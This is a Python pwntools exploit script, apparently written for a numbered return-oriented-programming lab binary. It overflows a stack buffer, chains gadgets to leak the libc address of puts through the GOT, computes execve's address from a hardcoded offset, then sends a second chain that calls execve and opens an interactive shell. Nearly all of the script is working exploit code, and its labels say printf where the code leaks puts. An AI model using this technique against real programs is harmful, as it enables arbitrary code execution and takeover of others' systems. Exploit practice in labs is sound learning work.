#!/usr/bin/env python

from pwn import *

p = process("./rop-5-64")


'''
p = process("./rop-5-xx")
context.terminal = ["tmux", "splitw", "-h"]
gdb.attach(p)
'''

got_of_puts = p.elf.got['puts']
puts_at_plt = p.elf.plt['puts']
input_func = p.elf.symbols['input_func']
print("Got of printf %s" % hex(got_of_puts))
print("Printf@plt %s" % hex(puts_at_plt))
print("input_func() %s" % hex(input_func))

buf = "A" * 0x80 + "B" * 0x8

'''
0x000000000040075b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040075f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400590 : pop rbp ; ret
0x0000000000400763 : pop rdi ; ret
0x0000000000400688 : pop rdx ; nop ; pop rbp ; ret
0x0000000000400761 : pop rsi ; pop r15 ; ret
0x000000000040075d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
'''
pop_rdi_ret = p64(0x0000000000400763)
pop_rsi_r15 = p64(0x0000000000400761)
pop_rdx_rbp = p64(0x0000000000400688)






buf += pop_rdi_ret
buf += p64(got_of_puts)
buf += p64(puts_at_plt)
buf += p64(input_func)






print("FIRST: "+p.recv())

p.sendline(buf)

data = p.recv()

print("OUTPUT: "+repr(data))


raw_data = data[147:]

print(repr(raw_data))

libc_printf = u64(raw_data[:6]+ "\x00\x00")

print("Addr of printf %s" % hex(libc_printf))

"""
pwndbg> print execve
$1 = {<text variable, no debug info>} 0x7f40f007c770 <execve>
pwndbg> print puts
$2 = {<text variable, no debug info>} 0x7f40f001f690 <_IO_puts>
"""


offset = 0x7f40f007c770 -0x7f40f001f690
print("OFFSET: "+hex(offset))


libc_execve = libc_printf + offset

buf = "A" * 0x80 + "BBBBBBBB"


buf += pop_rdi_ret
buf += p64(0x400020)
buf += pop_rsi_r15
buf += p64(0)
buf += p64(0)
buf += pop_rdx_rbp
buf += p64(0)
buf += p64(0)
buf += p64(libc_execve)

with open("buf.txt", "wb") as f:
    f.write(buf)


p.sendline(buf)

p.interactive()